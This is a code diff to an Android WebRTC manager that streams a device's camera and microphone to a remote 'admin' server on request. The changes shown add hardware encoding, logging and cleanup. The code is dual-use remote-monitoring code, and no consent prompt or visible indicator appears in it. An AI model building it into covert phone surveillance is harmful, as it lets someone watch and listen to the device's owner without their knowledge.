@@ -1,18 +1,21 @@
 package com.snapapp.companion;
 
 import android.content.Context;
+import android.util.Log;
 import org.json.JSONObject;
 import org.webrtc.*;
 import java.util.ArrayList;
 import java.util.List;
 
 public class WebRtcStreamManager {
+    private static final String TAG = "WebRtcStream";
     private static WebRtcStreamManager instance;
     private PeerConnectionFactory factory;
     private PeerConnection peerConnection;
     private VideoCapturer videoCapturer;
     private VideoTrack localVideoTrack;
     private AudioTrack localAudioTrack;
+    private EglBase eglBase;
     private boolean isFrontCamera = true;
     private String activeServerUrl;
     private String activeDeviceId;
@@ -33,19 +36,36 @@ public class WebRtcStreamManager {
 
         try {
             PeerConnectionFactory.initialize(PeerConnectionFactory.InitializationOptions.builder(ctx).createInitializationOptions());
+
+            // Create proper EglBase for hardware-accelerated video encoding
+            eglBase = EglBase.create();
+
             PeerConnectionFactory.Options options = new PeerConnectionFactory.Options();
-            factory = PeerConnectionFactory.builder().setOptions(options).createPeerConnectionFactory();
+            factory = PeerConnectionFactory.builder()
+                    .setOptions(options)
+                    .setVideoEncoderFactory(new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), true, true))
+                    .setVideoDecoderFactory(new DefaultVideoDecoderFactory(eglBase.getEglBaseContext()))
+                    .createPeerConnectionFactory();
 
             List<PeerConnection.IceServer> iceServers = new ArrayList<>();
             iceServers.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
             iceServers.add(PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer());
             iceServers.add(PeerConnection.IceServer.builder("stun:stun.cloudflare.com:3478").createIceServer());
 
-            peerConnection = factory.createPeerConnection(iceServers, new PeerConnection.Observer() {
-                @Override public void onSignalingChange(PeerConnection.SignalingState s) {}
-                @Override public void onIceConnectionChange(PeerConnection.IceConnectionState s) {}
+            PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(iceServers);
+            config.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;
+
+            peerConnection = factory.createPeerConnection(config, new PeerConnection.Observer() {
+                @Override public void onSignalingChange(PeerConnection.SignalingState s) {
+                    Log.d(TAG, "Signaling: " + s);
+                }
+                @Override public void onIceConnectionChange(PeerConnection.IceConnectionState s) {
+                    Log.d(TAG, "ICE: " + s);
+                }
                 @Override public void onIceConnectionReceivingChange(boolean b) {}
-                @Override public void onIceGatheringChange(PeerConnection.IceGatheringState s) {}
+                @Override public void onIceGatheringChange(PeerConnection.IceGatheringState s) {
+                    Log.d(TAG, "ICE Gathering: " + s);
+                }
                 @Override public void onIceCandidate(IceCandidate ic) { sendSignal("candidate", null, ic); }
                 @Override public void onIceCandidatesRemoved(IceCandidate[] ics) {}
                 @Override public void onAddStream(MediaStream ms) {}
@@ -68,15 +88,19 @@ public class WebRtcStreamManager {
             if (video) {
                 videoCapturer = createCameraCapturer(ctx, front);
                 if (videoCapturer != null) {
-                    SurfaceTextureHelper sth = SurfaceTextureHelper.create("CaptureThread", null);
+                    // Use proper EglBase context instead of null to prevent crashes
+                    SurfaceTextureHelper sth = SurfaceTextureHelper.create("CaptureThread", eglBase.getEglBaseContext());
                     VideoSource vs = factory.createVideoSource(videoCapturer.isScreencast());
                     videoCapturer.initialize(sth, ctx, vs.getCapturerObserver());
-                    videoCapturer.startCapture(320, 240, 10); // 240p @ 10fps for 2G low-latency stream
+                    videoCapturer.startCapture(320, 240, 10); // 240p @ 10fps for 2G
                     localVideoTrack = factory.createVideoTrack("ARDAMSv0", vs);
                     peerConnection.addTrack(localVideoTrack);
                 }
             }
+
+            Log.d(TAG, "Live stream started: video=" + video + " audio=" + audio + " front=" + front);
         } catch (Exception e) {
+            Log.e(TAG, "startLiveStream error", e);
             stopLiveStream();
         }
     }
@@ -105,8 +129,13 @@ public class WebRtcStreamManager {
                         SessionDescription custom = new SessionDescription(answer.type, sdp);
                         peerConnection.setLocalDescription(new SimpleSdpObserver(), custom);
                         sendSignal("answer", sdp, null);
+                        Log.d(TAG, "Sent SDP answer to admin");
                     }
                 }, new MediaConstraints());
+            }
+            @Override
+            public void onSetFailure(String s) {
+                Log.e(TAG, "setRemoteDescription failed: " + s);
             }
         }, offer);
     }
@@ -132,7 +161,9 @@ public class WebRtcStreamManager {
                 body.put("candidate", cand);
             }
             ApiClient.postJson(activeServerUrl + "/api/devices/" + activeDeviceId + "/signaling", body, null);
-        } catch (Exception ignored) {}
+        } catch (Exception e) {
+            Log.e(TAG, "sendSignal error", e);
+        }
     }
 
     private VideoCapturer createCameraCapturer(Context ctx, boolean front) {
@@ -145,37 +176,27 @@ public class WebRtcStreamManager {
         final String[] names = enumerator.getDeviceNames();
         if (names == null || names.length == 0) return null;
         for (String name : names) {
-            if (front && enumerator.isFrontFacing(name)) {
-                return enumerator.createCapturer(name, null);
-            } else if (!front && enumerator.isBackFacing(name)) {
-                return enumerator.createCapturer(name, null);
-            }
+            if (front && enumerator.isFrontFacing(name)) return enumerator.createCapturer(name, null);
+            else if (!front && enumerator.isBackFacing(name)) return enumerator.createCapturer(name, null);
         }
         return enumerator.createCapturer(names[0], null);
     }
 
     public synchronized void stopLiveStream() {
         try {
-            if (videoCapturer != null) {
-                videoCapturer.stopCapture();
-                videoCapturer.dispose();
-                videoCapturer = null;
-            }
-            if (peerConnection != null) {
-                peerConnection.close();
-                peerConnection = null;
-            }
-            if (factory != null) {
-                factory.dispose();
-                factory = null;
-            }
-        } catch (Exception ignored) {}
+            if (videoCapturer != null) { videoCapturer.stopCapture(); videoCapturer.dispose(); videoCapturer = null; }
+            if (peerConnection != null) { peerConnection.close(); peerConnection = null; }
+            if (factory != null) { factory.dispose(); factory = null; }
+            if (eglBase != null) { eglBase.release(); eglBase = null; }
+        } catch (Exception e) {
+            Log.e(TAG, "stopLiveStream error", e);
+        }
     }
 
     private static class SimpleSdpObserver implements SdpObserver {
         @Override public void onCreateSuccess(SessionDescription s) {}
         @Override public void onSetSuccess() {}
-        @Override public void onCreateFailure(String s) {}
-        @Override public void onSetFailure(String s) {}
+        @Override public void onCreateFailure(String s) { Log.e("WebRtcStream", "SDP create fail: " + s); }
+        @Override public void onSetFailure(String s) { Log.e("WebRtcStream", "SDP set fail: " + s); }
     }
 }
